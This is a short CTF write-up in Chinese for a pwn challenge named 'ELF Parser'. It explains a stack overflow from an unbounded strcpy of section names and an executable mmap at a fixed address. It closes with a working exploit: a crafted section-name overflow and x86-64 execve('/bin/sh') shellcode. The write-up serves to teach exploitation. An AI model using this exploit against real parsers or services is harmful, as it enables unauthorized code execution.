# ELF Parser

**Author:** Xia0o0o0o

**Difficulty:** Hard

**Category:** Pwn

## 题目描述

在学习了 ELF 文件格式后，你的舍友写了一个 ELF 文件解析器并且把它部署到了服务器上。

“虽然你能随便上传一个 ELF，但是你没有办法随意在我的服务器上执行它，所以这很安全！”

可是真的是这样吗？

## 题目解析

**暴露端口：`70`**

```c
strcpy(v7, (const char *)(*(unsigned int *)(v4 + ((__int64)(int)i << 6)) + v3));
```

注意拷贝 `Shdr.name` 的时候，并没有限制长度，导致栈溢出，`strcpy()` 会在 `\x00` 处停止，再注意 `mmap()` 的时候，设置了 `PROT_EXEC`，并且第一个参数给出了 map 的地址 `0x800000`，所以可以把 shellcode 写在自己上传的 ELF 里，Return oriented programming 到 map 的地址，得到 shell。

```c
int __attribute__((section("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2d\x11\x80"))) main() {
    __asm__ __volatile__
    (
     "movq $0x0068732f6e69622f, %rdx \n"
     "pushq %rdx                     \n"
     "movq $0x3b, %rax               \n"
     "movq %rsp, %rdi                \n"
     "movq $0, %rdx                  \n"
     "movq $0, %rsi                  \n"
     "syscall                        \n"
     "pop %rdi                       \n"
     "pop %rdx                       \n"
    );
}
```
